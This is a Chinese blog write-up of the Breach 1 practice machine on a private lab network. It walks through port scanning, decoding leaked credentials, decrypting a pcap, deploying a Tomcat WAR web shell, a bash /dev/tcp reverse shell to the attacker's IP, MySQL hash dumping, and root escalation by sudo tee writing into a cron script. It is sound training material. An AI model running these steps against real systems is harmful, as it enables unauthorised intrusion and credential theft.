@@ -1,0 +1,1367 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="靶机渗透," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="spira1" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="信息收集IP：192.168.110.140 端口：1nmap 192.168.110.140 -p 1-65535 这个靶机开了一千多个端口竟然 筛选了一些常用端口 12345621/tcp    open  ftp22/tcp    open  ssh23/tcp    open  telnet25/tcp    open  smtp70/tcp    open  gopher80/tcp">
+<meta name="keywords" content="靶机渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机渗透_Breach1">
+<meta property="og:url" content="http://eagerseven.cn/2018/12/31/靶机渗透-Breach1/index.html">
+<meta property="og:site_name" content="spira1">
+<meta property="og:description" content="信息收集IP：192.168.110.140 端口：1nmap 192.168.110.140 -p 1-65535 这个靶机开了一千多个端口竟然 筛选了一些常用端口 12345621/tcp    open  ftp22/tcp    open  ssh23/tcp    open  telnet25/tcp    open  smtp70/tcp    open  gopher80/tcp">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwgy1fwjo9t5ep5j31kw0qnb29.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwjodtuqwij30gy093aij.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwjopfvjzrj30dy03ijrq.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwgy1fwjpy8c1q8j318e0jy78t.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwjqqwxjhuj31jo08g0vp.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwjrek3c7bj30zo09yjtd.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwjrn638n0j30zo07u0us.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwjruatghoj3104080q3r.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fwk6qr8aq3j30w605eq3w.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwgy1fwk8akv2f3j30ta03kwex.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwgy1fwk8bj01mej31kw14yh6r.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fwkku7qr69j30mk0f70tu.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fwkkvvvvr2j30l00ejt9h.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fwkkx5n48oj30mg03saa5.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNbRwly1fwkky97gxsj30am083mxa.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fwko6f1gccj30gd032wf9.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fwkofbb012j30tz03gjt1.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fwkoiqwa2ij30rr05bwh7.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fwkouypcjtj30ew04vjs8.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fwkp86gq8zj30eu02p748.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fwkp9s8ziaj30ax01hjra.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fwkpc6b86zj30iy04dq3e.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fwkpic9080j308202j74a.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fwkpq0fo2pj30pc0gpmzw.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fwkprafoqbj30or05gwel.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fwkqh6dfunj306601kt8q.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1bd717433b.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1bde72ea17.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1c11a3f7bc.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1c1774e7e0.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1c2f0398da.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1c42b9ab41.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1c4c0827e2.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1c68dee354.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1c75271b7d.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1c7df8f532.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1c836ee986.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1c8e1e47e2.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1ca8ea191c.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1cb38b9fe1.jpg">
+<meta property="og:image" content="https://i.loli.net/2018/10/25/5bd1cbdc8cafe.jpg">
+<meta property="og:updated_time" content="2018-12-31T08:12:50.670Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="靶机渗透_Breach1">
+<meta name="twitter:description" content="信息收集IP：192.168.110.140 端口：1nmap 192.168.110.140 -p 1-65535 这个靶机开了一千多个端口竟然 筛选了一些常用端口 12345621/tcp    open  ftp22/tcp    open  ssh23/tcp    open  telnet25/tcp    open  smtp70/tcp    open  gopher80/tcp">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/006tNbRwgy1fwjo9t5ep5j31kw0qnb29.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eagerseven.cn/2018/12/31/靶机渗透-Breach1/"/>
+
+
+
+
+
+  <title>靶机渗透_Breach1 | spira1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">spira1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            Music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eagerseven.cn/2018/12/31/靶机渗透-Breach1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="spira1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="spira1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">靶机渗透_Breach1</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-31T16:12:00+08:00">
+                2018-12-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1,954
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="IP："><a href="#IP：" class="headerlink" title="IP："></a>IP：</h4><p>192.168.110.140</p>
+<h4 id="端口："><a href="#端口：" class="headerlink" title="端口："></a>端口：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.110.140 -p 1-65535</span><br></pre></td></tr></table></figure>
+<p>这个靶机开了一千多个端口竟然</p>
+<p>筛选了一些常用端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">23/tcp    open  telnet</span><br><span class="line">25/tcp    open  smtp</span><br><span class="line">70/tcp    open  gopher</span><br><span class="line">80/tcp    open  http</span><br></pre></td></tr></table></figure>
+<h4 id="服务器："><a href="#服务器：" class="headerlink" title="服务器："></a>服务器：</h4><p>端口太多了，就不用nmap去判断服务器了，根据端口初步判断是Linux服务器</p>
+<p>因为是靶机，所以whois信息啊二级域名啊之类的就不搞了</p>
+<h4 id="web信息收集"><a href="#web信息收集" class="headerlink" title="web信息收集"></a>web信息收集</h4><p>访问80端口的web服务</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fwjo9t5ep5j31kw0qnb29.jpg" alt=""></p>
+<p>右键源码注释有一串字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</span><br></pre></td></tr></table></figure>
+<p>base64解码得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh</span><br></pre></td></tr></table></figure>
+<p>再次解码得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pgibbons:damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure>
+<p>有点像账号和密码，先留着</p>
+<p>源码还有个链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.110.140/initech.html</span><br></pre></td></tr></table></figure>
+<p>还有个图片链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.110.140/images/milton_beach.jpg</span><br></pre></td></tr></table></figure>
+<p>访问/images文件夹得到一张图片提示</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwjodtuqwij30gy093aij.jpg" alt=""></p>
+<p>看来要先看看源码才行</p>
+<p>访问第一个链接，右键源码发现有一个impresscms和一串提示字符串还有一个邮箱，应该是管理员的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--I&apos;m sitting on a beach reading your email! --&gt;</span><br><span class="line"></span><br><span class="line">webmaster@breach.local</span><br></pre></td></tr></table></figure>
+<p>突破点应该在cms上</p>
+<p>找到两个个源码泄漏</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.110.140/impresscms/modules/profile/</span><br><span class="line">http://192.168.110.140/impresscms/modules/banners/</span><br></pre></td></tr></table></figure>
+<p>但是显示没有权限访问</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fwjopfvjzrj30dy03ijrq.jpg" alt=""></p>
+<p>用之前解码的账号登录试试，成功登录</p>
+<p>Inbox好像是个邮箱，还有三封未读消息，一一读了下，点击回复就能看到聊天记录，其中一个貌似得到了点有用的信息</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fwjpy8c1q8j318e0jy78t.jpg" alt=""></p>
+<p>访问之就能拿到一个什么密钥</p>
+<p>但是打开乱码，不知道怎么利用，再看看别的</p>
+<p>在<code>View Account</code>标签那里的<code>Contributions</code>点开有一个链接，还是在源码看到的，不然太难发现了。进去有一个pcap的文件链接，还有一个tomcat:tomcat的账号，还不知道有什么用，先留着</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fwjqqwxjhuj31jo08g0vp.jpg" alt=""></p>
+<p>下载后翻了下，都是些ssl加密过的数据，前面给了个证书，但是不知道该怎么解密啊，网上有个方法是利用java的keytool</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fwjrek3c7bj30zo09yjtd.jpg" alt=""></p>
+<p>密码就是tomcat</p>
+<p>然后导出证书</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fwjrn638n0j30zo07u0us.jpg" alt=""></p>
+<p>接着将证书导入Wireshark开始解密数据：</p>
+<p>先用Wireshark打开目标文件包，然后首选项=&gt;Protocols=&gt;SSL=&gt;<code>edit</code>=&gt;导入证书</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fwjruatghoj3104080q3r.jpg" alt=""></p>
+<p>现在数据包里的数据就是明文了，新知识点，学到了</p>
+<p>包里拿到了一个账号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat:Tt\5D8F(#!*u=G)4m7zB</span><br></pre></td></tr></table></figure>
+<p>还有这么个地址</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fwk6qr8aq3j30w605eq3w.jpg" alt=""></p>
+<p>还有个后门</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwgy1fwk8akv2f3j30ta03kwex.jpg" alt=""></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>这里有个大坑，上面拿到的地址是https的，但是证书已经过期，只有找一个老一点的浏览器才能访问，我折腾了好久</p>
+<p>利用上面数据包里拿到的账号密码登录就行了</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fwk8bj01mej31kw14yh6r.jpg" alt=""></p>
+<p>tomcat版本是6.0.39，后门不能访问，但是是asp的，尝试部署war包getshell</p>
+<p>可以getshell，但是后台貌似有个脚本在定时删除木马，也不像狗，很迷，就利用这个shell在www，目录下留了个稳定的木马，菜刀连接就OK了</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fwkku7qr69j30mk0f70tu.jpg" alt=""></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>查看用户及服务器信息</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fwkkvvvvr2j30l00ejt9h.jpg" alt=""></p>
+<p>expdb上没找到合适的提权脚本，翻翻文件，这两个文件有点可疑</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fwkkx5n48oj30mg03saa5.jpg" alt=""></p>
+<p>查看里面是数据库连接信息</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fwkky97gxsj30am083mxa.jpg" alt=""></p>
+<p>那看能不能数据库提权</p>
+<p>之前在本机连接过数据库，是不能连接的，那反弹代理再连接试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.110.220/4444 0&gt;&amp;1&quot; | bash</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fwko6f1gccj30gd032wf9.jpg" alt=""></p>
+<p>这里还有个坑，一开始我并没有在这个shell反弹shell，是在上面提到的那个稳定的shell反弹的，但是那个shell并不能反弹，只有这个shell才可以</p>
+<p>使用上面得到的mysql账号密码登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
+<p>但是一直加载不出来是什么意思</p>
+<p>瞎敲了几次后发现要在退出数据库后才会回显</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fwkofbb012j30tz03gjt1.jpg" alt=""></p>
+<p>翻了下数据库里的东西，没啥有用的，那就直接查询下用户试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">select user,password from user;		//千万别select *，查询出来会乱</span><br><span class="line">quit;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fwkoiqwa2ij30rr05bwh7.jpg" alt=""></p>
+<p>milton用户的密码看样子是md5，扔到网站解密</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fwkouypcjtj30ew04vjs8.jpg" alt=""></p>
+<p> debian-sys-maint用户的密码mysql加密只知道是两次SHA1夹杂一次unhex，但是只在吐司查到，苦于没有账号</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fwkp86gq8zj30eu02p748.jpg" alt=""></p>
+<p>切换到milton用户，报错</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fwkp9s8ziaj30ax01hjra.jpg" alt=""></p>
+<p>问题不大， 上次遇到过这个问题， 用python调用bash就行了</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fwkpc6b86zj30iy04dq3e.jpg" alt=""></p>
+<p>在milton用户跟目录下发现有一张图片一个脚本</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fwkpic9080j308202j74a.jpg" alt=""></p>
+<p>用scp命令将其发送到本地</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp 目标文件路径 用户名@IP:/路径/</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fwkpq0fo2pj30pc0gpmzw.jpg" alt=""></p>
+<p>图片提示更底层？难道是有隐写</p>
+<p>但是脚本源码打开是说这里没有东西</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fwkprafoqbj30or05gwel.jpg" alt=""></p>
+<p>宁可信其有不可信其无，看看图片</p>
+<p>但是各种我所知道的隐写试了一圈，没发现什么东西</p>
+<p>还有一个blumbergh用户</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fwkqh6dfunj306601kt8q.jpg" alt=""></p>
+<p>看来需要找到这个用户的密码，提权到这个用户</p>
+<p>查看历史命令，没发现什么东西</p>
+<p>看了提示，是说隐写在别的图片里了，就把web目录下的别的图片都下载下来，一个一个试了下，发现bill.png里有别的东西</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1bd717433b.jpg" alt=""></p>
+<p>分离一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=bill.png of=123.txt skip=41 bs=1</span><br></pre></td></tr></table></figure>
+<p>查看123.txt，在末尾看到一串字符</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1bde72ea17.jpg" alt=""></p>
+<p>后面了解到，可以直接用exiftool直接查看exif信息</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1c11a3f7bc.jpg" alt=""></p>
+<p>成功提权到blumbergh</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1c1774e7e0.jpg" alt=""></p>
+<p>但是还是不能访问root文件夹，查看历史命令看看</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1c2f0398da.jpg" alt=""></p>
+<p>查看tidyup.sh文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Hacker Evasion Script</span></span><br><span class="line"><span class="comment">#Initech Cyber Consulting, LLC</span></span><br><span class="line"><span class="comment">#Peter Gibbons and Michael Bolton - 2016</span></span><br><span class="line"><span class="comment">#This script is set to run every 3 minutes as an additional defense measure against hackers.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf</span><br></pre></td></tr></table></figure>
+<p>每三分钟删除一次。。。。那前面的疑惑就能解开了</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1c42b9ab41.jpg" alt=""></p>
+<p>还是root权限</p>
+<p>而且脑子里突然多了个思路，既然它每三分钟运行一次，那如果在里面写入shell的话，不就可以提权到root权限了</p>
+<p>但是vim一下发现没有写入权限啊，再看看sudo的权限</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1c4c0827e2.jpg" alt=""></p>
+<p>当前的blumbergh用户可以以root权限运行/usr/bin/tee和/usr/share/cleanup/tidyup.sh</p>
+<p>这个tee是什么，搜下了</p>
+<blockquote>
+<p><strong>tee命令</strong>用于将数据重定向到文件，另一方面还可以提供一份重定向数据的副本作为后续命令的stdin。简单的说就是把数据重定向到给定文件和屏幕上。</p>
+<p>语法 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; tee(选项)(参数)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>选项 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; -a：向文件中重定向时使用追加模式；</span><br><span class="line">&gt; -i：忽略中断（interrupt）信号。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>参数 </p>
+<p>文件：指定输出重定向的文件。</p>
+<p>在终端打印stdout同时重定向到文件中：</p>
+</blockquote>
+<p>例如：</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1c68dee354.jpg" alt=""></p>
+<p>并且，1.txt会被删除</p>
+<p>那就可以将某个shell文件写入这个tidyup.sh来提权了</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1c75271b7d.jpg" alt=""></p>
+<p>没有写入权限竟然，换个目录试试</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1c7df8f532.jpg" alt=""></p>
+<p>没有这个命令？用上面得到的bee命令路径试试</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1c836ee986.jpg" alt=""></p>
+<p>还是没权限</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1c8e1e47e2.jpg" alt=""></p>
+<p>成功！</p>
+<p><img src="https://i.loli.net/2018/10/25/5bd1ca8ea191c.jpg" alt=""></p>
